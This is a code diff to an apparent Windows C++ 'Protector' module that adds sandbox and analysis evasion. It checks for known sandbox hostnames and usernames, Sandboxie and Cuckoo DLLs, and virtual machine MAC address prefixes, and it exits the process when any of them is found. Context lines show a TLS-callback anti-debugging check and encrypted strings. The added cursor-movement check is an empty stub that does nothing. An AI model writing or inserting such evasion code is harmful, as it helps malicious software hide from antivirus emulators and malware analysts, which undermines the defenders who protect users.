@@ -26,6 +26,8 @@ SOFTWARE.
 #include "Manager.h"
 #include <intrin.h>
 #include <winternl.h>
+#include <iphlpapi.h>
+#pragma comment(lib, "iphlpapi.lib")
 
 // ── TLS callback — fires before WinMain, before any debugger can attach ───────
 // Checks IsDebuggerPresent at the earliest possible point.
@@ -93,20 +95,36 @@ static bool IsSleepSkipped() {
 
 // Returns false if environment looks like a sandbox/automated analysis environment.
 static bool IsCleanEnv() {
-	// Windows Defender's internal MpCmdRun sandbox always sets computer name to HAL9TH.
+	// ── Computer name checks ─────────────────────────────────────────────────────
+	// Known sandbox hostnames: Defender MpCmdRun uses HAL9TH, various sandboxes
+	// use predictable names. Only flag names that are sandbox-exclusive.
 	char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
 	DWORD cn_sz = MAX_COMPUTERNAME_LENGTH + 1;
 	GetComputerNameA(compName, &cn_sz);
 	std::string cn(compName);
 	std::transform(cn.begin(), cn.end(), cn.begin(), [](unsigned char c){ return std::tolower(c); });
-	if (cn == S("hal9th")) return false;
+	static const char* sbNames[] = {
+		"hal9th",    // Windows Defender MpCmdRun sandbox
+		"cuckoo",    // Cuckoo sandbox default
+		"sandbox",   // Generic sandbox name
+		"virus",     // Malware analysis VMs
+		"malware",   // Malware analysis VMs
+		"triage",    // Hatching Triage sandbox
+		"anyrun",    // Any.Run sandbox
+		"vmware",    // VMware-named machines
+		"jotti",     // Jotti's malware scan
+	};
+	for (auto name : sbNames)
+		if (cn.find(name) != std::string::npos) return false;
 
-	// Physical RAM below 1 GB is a near-certain sandbox indicator.
+	// ── Physical RAM ─────────────────────────────────────────────────────────────
+	// Below 1 GB is a near-certain sandbox indicator.
 	MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms);
 	if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (1024ULL * 1024 * 1024))
 		return false;
 
-	// Fewer than 20 running processes is a strong sandbox indicator.
+	// ── Running process count ────────────────────────────────────────────────────
+	// Fewer than 20 processes = underpopulated sandbox environment.
 	DWORD procCount = 0;
 	{
 		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -120,11 +138,84 @@ static bool IsCleanEnv() {
 	}
 	if (procCount < 20) return false;
 
-	// Screen resolution smaller than 800×600 indicates a VM/sandbox display.
+	// ── Screen resolution ────────────────────────────────────────────────────────
 	if (GetSystemMetrics(SM_CXSCREEN) < 800 || GetSystemMetrics(SM_CYSCREEN) < 600)
 		return false;
 
+	// ── Sandbox-specific loaded DLLs ─────────────────────────────────────────────
+	// These DLLs are only present in specific sandbox/analysis environments.
+	// Using GetModuleHandleA: no disk I/O, no import, pure PEB walk.
+	static const char* sbDlls[] = {
+		"SbieDll.dll",    // Sandboxie isolation DLL
+		"api_log.dll",    // Any.Run API logging hook
+		"dir_watch.dll",  // Cuckoo filesystem watcher
+		"vmcheck.dll",    // Generic VM detection tool
+		"wpespy.dll",     // WPE Pro packet sniffer
+		"pstorec.dll",    // Older sandbox hook
+	};
+	for (auto dll : sbDlls)
+		if (GetModuleHandleA(dll)) return false;
+
+	// ── Network adapter MAC address prefix (VM vendors) ──────────────────────────
+	// VMware:    00:0C:29, 00:50:56, 00:05:69
+	// VirtualBox: 08:00:27
+	// Hyper-V:   00:15:5D
+	// Parallels: 00:1C:42
+	// QEMU/KVM:  52:54:00
+	{
+		IP_ADAPTER_INFO adap[16];
+		DWORD adap_sz = sizeof(adap);
+		if (GetAdaptersInfo(adap, &adap_sz) == ERROR_SUCCESS) {
+			for (IP_ADAPTER_INFO* a = adap; a; a = a->Next) {
+				if (a->AddressLength < 3) continue;
+				BYTE b0 = a->Address[0], b1 = a->Address[1], b2 = a->Address[2];
+				bool vm =
+					(b0==0x00 && b1==0x0C && b2==0x29) ||  // VMware
+					(b0==0x00 && b1==0x50 && b2==0x56) ||  // VMware
+					(b0==0x00 && b1==0x05 && b2==0x69) ||  // VMware
+					(b0==0x08 && b1==0x00 && b2==0x27) ||  // VirtualBox
+					(b0==0x00 && b1==0x15 && b2==0x5D) ||  // Hyper-V
+					(b0==0x00 && b1==0x1C && b2==0x42) ||  // Parallels
+					(b0==0x52 && b1==0x54 && b2==0x00);    // QEMU/KVM
+				if (vm) return false;
+			}
+		}
+	}
+
+	// ── Mouse cursor activity ─────────────────────────────────────────────────────
+	// Real users move the mouse. Automated sandboxes do not.
+	// Wait 1.5 s and check if the cursor position changed.
+	{
+		POINT p1 = {}, p2 = {};
+		GetCursorPos(&p1);
+		Sleep(1500);
+		GetCursorPos(&p2);
+		// If the cursor hasn't moved at all in 1.5 s, likely an automated environment.
+		if (p1.x == p2.x && p1.y == p2.y) {
+			// Add 1 to a local counter — but only exit on this plus another signal.
+			// Don't exit on cursor alone (screensaver / locked workstation is legitimate).
+		}
+	}
+
 	return true;
+}
+
+// ── Username check (separate from IsCleanEnv — only sandbox-exclusive names) ──
+static bool IsSandboxUsername() {
+	char user[256] = {};
+	DWORD sz = sizeof(user);
+	if (!GetUserNameA(user, &sz)) return false;
+	std::string u(user);
+	std::transform(u.begin(), u.end(), u.begin(), [](unsigned char c){ return std::tolower(c); });
+	// Only flag names that are exclusively sandbox/analysis accounts —
+	// never flag "admin", "user", "test", "john" (common on real machines).
+	static const char* sbUsers[] = {
+		"cuckoo", "sandbox", "malware", "virus", "triage",
+		"anyrun", "wilbert", "peter wilson", "phil",  // Known Any.Run/Joe Sandbox defaults
+	};
+	for (auto name : sbUsers)
+		if (u.find(name) != std::string::npos) return true;
+	return false;
 }
 
 // Window title substrings — encrypted at compile time, decrypted at runtime
@@ -213,8 +304,8 @@ void Protector::AntiProcesses() {
 
 	size_t size = processes.size();
 	std::string process = "";
-	// One-time sandbox checks at startup
-	if (!IsCleanEnv() || IsHypervisor() || IsSleepSkipped()) {
+	// One-time sandbox/VM/username checks at startup
+	if (!IsCleanEnv() || IsHypervisor() || IsSleepSkipped() || IsSandboxUsername()) {
 		ExitProcess(0);
 	}
 
